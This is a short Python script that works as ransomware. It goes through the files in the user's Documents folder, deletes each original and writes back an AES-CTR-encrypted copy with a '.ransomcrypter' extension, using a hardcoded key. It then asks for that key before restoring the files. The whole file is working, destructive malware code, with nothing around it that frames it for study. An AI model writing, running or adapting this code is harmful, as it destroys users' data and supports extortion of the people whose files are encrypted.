import os
import glob
import time
import pyaes
from pathlib import Path

lst_arq = ["*.*"]

print("Encrypting")
time.sleep(3)

try:
    documents = Path.home() / "Documents"

except Exception:
    pass

os.chdir(documents)

def Encrypting():
    for files in lst_arq:
        for format_file in glob.glob(files):
            print(format_file)
            f = open(f'{documents}\\{format_file}', 'rb')
            file_data = f.read()
            f.close()

            os.remove(f'{documents}\\{format_file}')
            key = b"1ab2c3e4f5g6h7i8"
            aes = pyaes.AESModeOfOperationCTR(key)
            crypto_data = aes.encrypt(file_data)

            new_file = format_file + ".ransomcrypter"
            new_file = open(f'{documents}\\{new_file}', 'wb')
            new_file.write(crypto_data)
            new_file.close()

def descrypt(decrypt_file):
    try:
        for file in glob.glob('*.ransomcrypter'):

            keybytes = decrypt_file.encode()
            name_file = open(file, 'rb')
            file_data = name_file.read()
            dkey = keybytes
            daes = pyaes.AESModeOfOperationCTR(dkey)
            decrypt_data = daes.decrypt(file_data)

            format_file = file.split('.')
            new_file_name = format_file[0] + '.' + format_file[1]

            dnew_file = open(f'{documents}\\{new_file_name}', 'wb')
            dnew_file.write(decrypt_data)
            dnew_file.close()
    except ValueError as err:
        print("Invalid key")

if __name__ == '__main__':
    Encrypting()
    if Encrypting:
        key = input("Enter the key to decrypt: ")
        if key == '1ab2c3e4f5g6h7i8':
            descrypt(key)
            for del_file in glob.glob('*.ransomcrypter'):
                os.remove(f'{documents}\\{del_file}')
        else:
            print("Invalid release key")
